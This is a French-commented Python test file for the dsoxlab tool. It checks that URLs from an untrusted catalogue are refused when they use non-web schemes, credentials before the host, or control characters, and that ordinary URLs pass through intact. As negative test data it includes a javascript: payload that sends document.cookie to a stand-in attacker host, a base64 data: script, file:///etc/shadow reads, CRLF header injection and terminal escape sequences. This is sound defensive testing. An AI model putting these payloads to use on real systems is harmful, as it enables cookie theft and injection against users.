"""La politique des URL venant d'un catalogue, éprouvée dans les deux sens.

Un catalogue est une **entrée non fiable** : ``dsoxlab catalog add <url>`` clone
un dépôt git arbitraire, et ce dépôt décide de ce que ``doc_url`` et
``repo.issues_url`` contiennent. Le défaut de départ a été mesuré, pas supposé :

.. code-block:: yaml

    doc_url: "javascript:fetch('https://attaquant.test/'+document.cookie)"

``dsoxlab guide mauvais --print`` rendait cette valeur telle quelle, et sans
``--print`` elle atteignait ``webbrowser.open()``.

Ce fichier tient les deux moitiés de la règle. Les tests **négatifs** disent ce
qui doit être refusé — c'est eux qui font le travail, une politique n'étant
qu'une suite de refus. Les tests **positifs** disent qu'une URL ordinaire
traverse intacte : un contrôle de sécurité qui casse l'usage normal se fait
désactiver, et ne protège alors plus rien.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest
from typer.testing import CliRunner

from dsoxlab.cli import app
from dsoxlab.models.lab import LabDefinition, ValidationConfig
from dsoxlab.models.runtime import RuntimeConfig, RuntimeType
from dsoxlab.security.urls import PolitiqueURL, URLRefusee, url_sure
from dsoxlab.services import guide_url

runner = CliRunner()


def _lab(doc_url: str) -> LabDefinition:
    return LabDefinition(
        id="un-lab",
        title="Un lab",
        level="l1",
        skills=["s"],
        runtime=RuntimeConfig(type=RuntimeType.SHELL),
        distros=["alma10"],
        doc_url=doc_url,
        validation=ValidationConfig(),
    )


# ── les schémas : tout ce qui fait agir la machine ───────────────────────────

@pytest.mark.parametrize("valeur", [
    # Le défaut d'origine, exactement tel qu'il a été reproduit.
    "javascript:fetch('https://attaquant.test/'+document.cookie)",
    # Une page entière livrée par la valeur elle-même, hors de tout site.
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    # Lire un fichier du poste, et le montrer à qui a écrit le catalogue.
    "file:///etc/shadow",
    "ftp://attaquant.test/charge",
    "ssh://attaquant.test/",
    # Un gestionnaire de protocole installé sur la machine : c'est lui qui
    # décide de ce qui s'exécute, et le catalogue choisit lequel appeler.
    "zoommtg://zoom.us/join?confno=1",
    "vscode://file/etc/passwd",
])
def test_un_schema_hors_du_web_est_refuse(valeur: str) -> None:
    with pytest.raises(URLRefusee) as leve:
        url_sure(valeur, champ="doc_url")
    assert leve.value.cle == "securite_url_schema"


def test_une_url_sans_schema_est_refusee() -> None:
    """``exemple.test/guide`` n'est pas une URL : le navigateur devinerait."""
    with pytest.raises(URLRefusee):
        url_sure("exemple.test/guide", champ="doc_url")


# ── la structure : ce qui trompe l'œil ───────────────────────────────────────

def test_une_url_sans_hote_est_refusee() -> None:
    with pytest.raises(URLRefusee) as leve:
        url_sure("https:///guide", champ="doc_url")
    assert leve.value.cle == "securite_url_sans_hote"


@pytest.mark.parametrize("valeur", [
    "https://vrai-site.test@attaquant.test/",
    "https://utilisateur:motdepasse@attaquant.test/",
])
def test_des_identifiants_avant_l_hote_sont_refuses(valeur: str) -> None:
    """L'œil lit le premier nom, le navigateur va au second."""
    with pytest.raises(URLRefusee) as leve:
        url_sure(valeur, champ="doc_url")
    assert leve.value.cle == "securite_url_identifiants"


@pytest.mark.parametrize("valeur", [
    "https://exemple.test/\r\nSet-Cookie: vole=1",   # une ligne injectée
    "https://exemple.test/\nligne-suivante",
    "https://exemple.test/\x1b]0;titre volé\x07",    # OSC : renomme la fenêtre
    "https://exemple.test/\x07",                     # BEL
    "https://exemple.test/\x00",
])
def test_un_caractere_de_controle_se_refuse(valeur: str) -> None:
    with pytest.raises(URLRefusee) as leve:
        url_sure(valeur, champ="doc_url")
    assert leve.value.cle == "securite_url_caractere"


def test_le_refus_porte_une_cle_pas_une_phrase() -> None:
    """La commande qui l'attrape parle la langue de l'apprenant, pas la nôtre."""
    with pytest.raises(URLRefusee) as leve:
        url_sure("file:///etc/shadow", champ="doc_url")
    assert leve.value.champ == "doc_url"
    assert leve.value.cle.startswith("securite_url_")
    assert leve.value.params["scheme"] == "file"


# ── une URL ordinaire traverse sans être abîmée ──────────────────────────────

@pytest.mark.parametrize("valeur", [
    "https://exemple.test/guide",
    "https://exemple.test/guide/?lang=fr&page=2",
    "https://exemple.test/guide#ancre",
    "https://exemple.test:8443/guide",
    "http://exemple.test/vieux-guide",
    "https://exemple.test/guide%20avec%20espaces",
])
def test_une_url_ordinaire_traverse_intacte(valeur: str) -> None:
    assert url_sure(valeur, champ="doc_url") == valeur


# ── deux politiques, une seule implémentation ────────────────────────────────

def test_le_portail_refuse_le_transport_en_clair() -> None:
    """Le lien portera des résultats : en http, ils s'exposent en chemin."""
    with pytest.raises(URLRefusee) as leve:
        url_sure("http://portail.test/", champ="learning.portal_url",
                 politique=PolitiqueURL.PORTAIL)
    assert leve.value.cle == "securite_url_schema"
    assert url_sure("https://portail.test/", champ="learning.portal_url",
                    politique=PolitiqueURL.PORTAIL) == "https://portail.test/"


def test_la_documentation_tolere_le_clair() -> None:
    """Des catalogues publient encore en http, et la valeur est affichée."""
    assert url_sure("http://exemple.test/g", champ="doc_url",
                    politique=PolitiqueURL.DOCUMENTATION) == "http://exemple.test/g"


def test_les_politiques_sont_declaratives() -> None:
    """La divergence est un paramètre, pas un second validateur.

    Deux implémentations d'une même politique finissent toujours par diverger,
    et c'est la plus permissive qui décide. Le test le dit en exigeant que la
    contrainte du portail soit un **sous-ensemble** de l'autre.
    """
    assert set(PolitiqueURL.PORTAIL.value) < set(PolitiqueURL.DOCUMENTATION.value)


# ── aucune sonde réseau : le poste de l'apprenant n'est pas un relais ────────

def test_la_primitive_ne_touche_pas_au_reseau(monkeypatch: pytest.MonkeyPatch) -> None:
    """Sinon un catalogue fait émettre des requêtes depuis le poste ou la CI.

    Vers un service interne, par exemple : il suffirait de déclarer
    ``doc_url: http://192.168.1.1/admin`` pour que la validation aille frapper.
    """
    import socket
    import urllib.request

    def interdit(*_a: Any, **_k: Any) -> None:
        raise AssertionError("la validation a touché au réseau")

    monkeypatch.setattr(socket, "socket", interdit)
    monkeypatch.setattr(socket, "create_connection", interdit)
    monkeypatch.setattr(socket, "getaddrinfo", interdit)
    monkeypatch.setattr(urllib.request, "urlopen", interdit)

    assert url_sure("https://service-interne.test/admin", champ="doc_url")


# ── le point d'usage : valider AVANT de transformer ──────────────────────────

def test_le_guide_valide_avant_les_utm() -> None:
    """Greffer d'abord, valider ensuite reviendrait à ne pas valider.

    C'est le défaut mesuré : la valeur sortait enrichie de
    ``?utm_source=dsoxlab``, donc déjà transformée, donc déjà admise.
    """
    with pytest.raises(URLRefusee):
        guide_url(_lab("javascript:alert(1)"))


def test_un_guide_absent_reste_un_guide_absent() -> None:
    """Un champ vide n'est pas un refus : l'appelant a un autre message."""
    assert guide_url(_lab("")) is None


# ── rien du catalogue n'atteint le navigateur tout seul ──────────────────────

def test_afficher_un_guide_n_ouvre_rien(
    catalogue: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Une URL syntaxiquement sûre n'est pas une destination approuvée.

    ``guide`` affiche, l'utilisateur décide. C'est ``--open`` qui navigue, et
    c'est lui qui est explicite.
    """
    ouvertures: list[str] = []
    monkeypatch.setattr("webbrowser.open", lambda url: ouvertures.append(url) or True)

    resultat = runner.invoke(app, ["guide", "premier"])

    assert resultat.exit_code == 0
    assert "https://exemple.test/guide" in resultat.stdout
    assert ouvertures == []


def test_une_url_brute_du_contrat_n_atteint_pas_le_navigateur(
    catalogue: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Même sur demande explicite : `--open` ouvre une URL validée, ou rien.

    C'est le test que l'issue #273 réclame nommément — une valeur brute issue du
    contrat ne doit pas pouvoir atteindre ``webbrowser.open()``.
    """
    lab = catalogue / "labs" / "domaine" / "premier" / "lab.yaml"
    lab.write_text(
        lab.read_text(encoding="utf-8").replace(
            "doc_url: https://exemple.test/guide",
            "doc_url: \"javascript:fetch('https://attaquant.test/')\"",
        ),
        encoding="utf-8",
    )

    ouvertures: list[str] = []
    monkeypatch.setattr("webbrowser.open", lambda url: ouvertures.append(url) or True)

    resultat = runner.invoke(app, ["guide", "premier", "--open"])

    assert resultat.exit_code == 1
    assert ouvertures == []
    # La chaîne fautive n'est pas recopiée à l'écran : on dit pourquoi, pas quoi.
    assert "javascript:" not in resultat.stdout
